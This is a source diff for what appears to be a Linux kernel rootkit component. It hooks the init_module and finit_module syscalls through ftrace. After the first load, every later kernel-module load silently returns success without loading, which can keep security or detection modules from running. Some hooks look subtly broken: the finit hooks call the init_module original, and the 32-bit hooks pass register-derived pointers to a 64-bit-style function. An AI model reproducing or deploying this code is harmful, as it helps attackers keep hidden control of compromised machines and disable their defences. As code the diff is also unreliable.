@@ -2,16 +2,22 @@
 #include "../include/hooking_insmod.h"
 #include "../ftrace/ftrace_helper.h"
 
+// module_count = 0 = singularity
+static uint32_t module_count = 0;
 static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
 static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);
 static asmlinkage long (*hooked_init_module32)(struct file *file, const char *uargs, unsigned long flags);
 static asmlinkage long (*hooked_finit_module32)(struct file *file, const char *uargs, unsigned long flags);
 
 static notrace asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
+    if (!module_count++)
+        return hooked_init_module(file, uargs, flags);
     return 0;
 }
 
 static notrace asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
+    if (!module_count++)
+        return hooked_init_module(file, uargs, flags);
     return 0;
 }
 
@@ -19,6 +25,9 @@ static notrace asmlinkage long hook_init_module32(struct pt_regs *regs) {
     struct file *file = (struct file *)regs->bx;
     const char *uargs = (const char *)regs->cx;
     unsigned long flags = regs->dx;
+
+    if (!module_count++)
+        return hooked_init_module(file, uargs, flags);
 
     (void)file; (void)uargs; (void)flags;
     return 0;
@@ -28,6 +37,9 @@ static notrace asmlinkage long hook_finit_module32(struct pt_regs *regs) {
     struct file *file = (struct file *)regs->bx;
     const char *uargs = (const char *)regs->cx;
     unsigned long flags = regs->dx;
+
+    if (!module_count++)
+        return hooked_init_module(file, uargs, flags);
 
     (void)file; (void)uargs; (void)flags;
     return 0;
